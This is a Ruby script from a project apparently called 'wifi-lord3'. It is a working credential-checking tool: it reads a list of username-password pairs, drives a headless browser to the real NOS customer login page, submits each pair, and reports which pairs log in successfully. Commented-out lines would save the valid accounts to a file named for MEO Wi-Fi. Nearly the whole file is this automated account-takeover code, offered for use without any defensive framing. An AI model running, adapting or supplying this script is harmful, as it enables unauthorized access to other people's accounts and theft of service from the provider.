# encoding: UTF-8
#!/usr/bin/env ruby
#https://support.saucelabs.com/customer/portal/articles/2005317-default-selenium-version-for-each-firefox-browser-version
##################################################################
# autor: retinadark                                              #
# email: retinadark@outlook.com                                  #
# git: https://github.com/retinadark/wifi-lord3                  #
# license: GNU GENERAL PUBLIC LICENSE, Version 3, 29 June 2007   #
# Copyright (C) 2016 ~ retinadark <retinadark@outlook.com>       #
##################################################################

require "selenium-webdriver"
require 'headless'
require 'colorize'

if ARGV[1] == nil
	puts "Erro, add browser parameter: chrome or firefox"
	exit
end

@SO= ARGV[1]

if ARGV[0] == nil
	@DUMP_PATH="/tmp/wifi-lord3/page/"
else
	@DUMP_PATH=ARGV[0]
end

@list = []

puts "Starting ...".green
puts " "

f = File.open(@DUMP_PATH, "r")
f.each_line do |line|
  @list << line.to_s.strip
end
f.close

@list.each do |obj|
	a,b=obj.split("-")

	
	@headless = Headless.new
   	@headless.start
	
	if @SO == "chrome"
		profile = Selenium::WebDriver::Chrome::Profile.new
		profile['download.prompt_for_download'] = false
		profile['download.default_directory'] = "/path/to/dir"

		profile['options']=['--no sandbox']
		profile['options']=['--user-data-dir']

		@driver = Selenium::WebDriver.for :chrome, :profile => profile
	else
		@driver = Selenium::WebDriver.for :firefox
	end
		
	@driver.navigate.to "https://login.nos.pt"
	sleep 1

	@driver.find_element(:name => "Username").send_keys a.strip 
	@driver.find_element(:name => "Password").send_keys b.strip
	@driver.find_element(:xpath => "/html/body/div/div/section[1]/form/div[3]/button").click
	sleep 2
		
	begin
		@driver.find_element(:xpath, "//*[contains(text(),'Gestão de Conta')]").displayed?
		puts "[V]".green +  " #{obj}"
		#File.open("#{@WORKDIR}/meo_wifi_valid_accounts.txt", 'a') { |file| file.write(obj) }
		#File.open("#{@WORKDIR}/meo_wifi_valid_accounts.txt", 'a') { |file| file.write("\n") }
		#@driver.find_element(:xpath => "/html/body/header/div/div[1]/img')]").click
		#sleep 2
		#@driver.find_element(:xpath => "/html/body/header/div/div[1]/div[2]/div[2]/div[2]/form/button')]").click
		@driver.close()
		@driver.quit()
		@headless.destroy
		sleep 2
	rescue Exception => e
		puts "[X]".red +  " #{obj}"
      		@driver.close()
		@driver.quit()
		@headless.destroy
		sleep 2
	end

end

puts " "
puts "Done".green
exit






